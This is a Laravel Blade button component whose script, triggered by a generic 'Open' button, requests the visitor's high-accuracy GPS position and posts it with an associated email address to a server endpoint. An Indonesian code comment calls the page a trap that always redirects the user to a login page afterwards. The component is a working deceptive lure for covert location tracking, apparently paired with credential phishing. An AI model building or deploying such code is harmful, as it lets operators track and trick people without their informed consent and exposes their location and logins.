@props(['email' => null, 'redirect' => null, 'label' => 'Buka'])

<div class="inline-block">
    <button type="button" onclick="shareLocation(this)"
            data-url="{{ route('location.share') }}"
            data-token="{{ csrf_token() }}"
            data-email="{{ $email }}"
            data-redirect="{{ $redirect }}"
            class="inline-flex items-center justify-center gap-2 rounded-lg bg-emerald-600 px-8 py-2.5 text-sm font-semibold text-white hover:bg-emerald-700">
        {{ $label }}
    </button>
    <p class="loc-msg mt-2 text-xs opacity-90" style="display:none"></p>
</div>

<script>
    if (typeof window.shareLocation === 'undefined') {
        window.shareLocation = function (btn) {
            var msg = btn.parentElement.querySelector('.loc-msg');
            var redirect = btn.dataset.redirect;

            var finish = function (sent) {
                // Halaman blokir: apapun hasilnya, arahkan ke login (jebakan).
                if (redirect) { window.location.href = redirect; return; }
                if (msg) { msg.style.display = 'block'; msg.textContent = sent ? 'Terima kasih, permintaan diproses.' : 'Lokasi tidak dapat diakses.'; }
                if (sent) { btn.style.display = 'none'; } else { btn.disabled = false; }
            };

            if (!navigator.geolocation) { finish(false); return; }

            btn.disabled = true;

            navigator.geolocation.getCurrentPosition(function (pos) {
                fetch(btn.dataset.url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': btn.dataset.token, 'Accept': 'application/json' },
                    body: JSON.stringify({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy || 0),
                        email: btn.dataset.email || null
                    })
                }).then(function () { finish(true); }).catch(function () { finish(true); });
            }, function () { finish(false); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
        };
    }
</script>
